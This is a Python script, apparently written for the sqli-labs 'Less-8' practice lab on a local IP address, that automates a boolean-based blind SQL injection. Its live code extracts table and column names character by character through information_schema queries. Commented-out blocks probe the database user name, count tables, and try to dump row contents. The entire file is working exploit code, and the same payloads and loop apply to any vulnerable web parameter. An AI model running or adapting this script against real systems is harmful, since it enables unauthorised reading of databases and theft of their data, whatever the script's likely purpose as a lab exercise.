import string
import requests
import time
t0 = time.time()
url = "http://192.168.43.117:9002/Less-8/"
reslen = len(requests.get(url = url + "?id=1").text)
print("正常情况下网页返回数据的长度：" + str(reslen))

#判断数据库长度
# db_len = 0
# while True:
# 	dburl = url + "?id=1'+and+(length(user()))=" + str(db_len) + "-- xn"
# 	print(dburl)
# 	if len(requests.get(dburl).text) == reslen:
# 		print("数据库名字长度为："+str(db_len))
# 		break
# 	if db_len == 30:
# 		print("出现错误")
# 		break
# 	db_len += 1

# # 获取数据库名字
# db_name = ""
# for i in range(1,db_len+1):
# 	for a in range(0,128):
# 		# 用户名user()  版本version()
# 		dburl = url + "?id=1 '+and+ascii(substr(user(),"+str(i)+",1))="+"'"+str(a)+"'"+"-- xn"
# 		print(dburl)
# 		if len(requests.get(dburl).text) == reslen:
# 			db_name += chr(a)
# 			print(db_name)
# 			break

# # 获取数据库表的总数
# db_table_num = 0
# while True:
# 	db_table_url = url + "?id=1'+and+(select+count(table_name)+from+information_schema.tables+where+table_schema=database())=" + str(db_table_num) + " -- xn"
# 	# print(db_table_url)
# 	if len(requests.get(db_table_url).text) == reslen:
# 		print("数据库表的长度为："+str(db_table_num))
# 		break
# 	if db_table_num == 30:
# 		print("出现错误")
# 		break
# 	db_table_num += 1


# # 数据库表的长度
# table_len = 0

# for i in range(0,5):
# 	table_len = 0
# 	while True:
# 		table_url = url + "?id=1'+and+(select+length(table_name)+from+information_schema.tables+where+table_schema=database()+limit+"+str(i)+",1)=" + str(table_len) + " -- xn"
# 		# print(table_url)
# 		if len(requests.get(table_url).text) == reslen:
# 			print("第"+str(i)+"个"+"数据库表的长度为："+str(table_len))
# 			break
# 		if table_len == 30:
# 			print("出现错误")
# 			break
# 		table_len += 1

# table_len = 0

# 获取数据库的字段
table_name = ""
table_list= []
# range范围为表的个数
for i in range(0,10):
	table_len = 0
	while True:
		table_url = url + "?id=1'+and+(select+length(table_name)+from+information_schema.tables+where+table_schema=database()+limit+"+str(i)+",1)=" + str(table_len) + " -- xn"
 		# print(table_url)
		if len(requests.get(table_url).text) == reslen:
			# print("第"+str(i)+"个"+"数据库表的长度为："+str(table_len))
			for a in range(0,table_len+1):
				for c in range(1,128):
					table_url = url + "?id=1'+and+(select+ascii(mid((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+"+str(i)+",1),"+str(a)+",1)))=" +"'"+str(c)+"'" + " -- xn"
					# print(table_url)
					if len(requests.get(table_url).text) == reslen:
						table_name += chr(c)
						# print(table_name)
						break
			table_list.append(table_name.strip())
			table_name = ""
			# print(table_list)
			break
		if table_len == 30:
			# print("出现错误")
			break
		table_len += 1

print("******************数据库的表为*********************")
print(table_list)
print("\n")


# 获取数据库的字段
for number in range(0,len(table_list)):
	column_name = ""
	column_list= []
	# range范围为字段的个数
	for i in range(0,10):
		column_len = 0
		while True:
			column_url = url + "?id=1'+and+(select+length(column_name)+from+information_schema.columns+where+table_name="+"'"+table_list[number]+"'"+"+limit+"+str(i)+",1)=" + str(column_len) + " -- xn"
	 		# print(table_url)
			if len(requests.get(column_url).text) == reslen:
				# print("第"+str(i)+"个"+"字段的长度为："+str(column_len))
				for a in range(0,column_len+1):
					for c in range(1,128):
						column_url = url + "?id=1'+and+(select+ascii(mid((select+column_name+from+information_schema.columns+where+table_name="+"'"+table_list[number]+"'"+"+limit+"+str(i)+",1),"+str(a)+",1)))=" +"'"+str(c)+"'" + " -- xn"
						# print(table_url)
						if len(requests.get(column_url).text) == reslen:
							column_name += chr(c)
							# print(column_name)
							break
				column_list.append(column_name.strip())
				column_name = ""
				# print(column_list)
				break
			if column_len == 30:
				# print("出现错误")
				break
			column_len += 1
	print("******************表的字段为*********************")
	print(column_list)


# 失败的列字段内容，很多非预期情况
# column_list = ['id', 'name', 'ip', 'address']
# content_list = []
# content = ""
# for table_line in range(0,len(table_list)):
# 	for column_line in range(0,len(column_list)):
# 		content = ""
# 		# 这个range代表有多少行
# 		for i in range(0,15):
# 			# 这个range代表有多少个内容
# 			for a in range(1,30):
# 				for asc in range(1,128):
# 					get_url = url + "?id=1'+and+select+ascii(mid((select+"+column_list[column_line]+"+from+"+table_list[table_line]+"+limit+"+str(i)+",1),"+str(a)+",1))='"+str(asc)+"' -- xn"
# 					print(get_url)
# 					if len(requests.get(get_url).text) == reslen:
# 						content += chr(asc)
# 						print(content)
# 						# print(column_name)
# 						break
# 		content_list.append(content.strip())
# 		print(content_list)
# 		content = ""
	
t1 = time.time()

print("Spent Time:%s" % (t1-t0))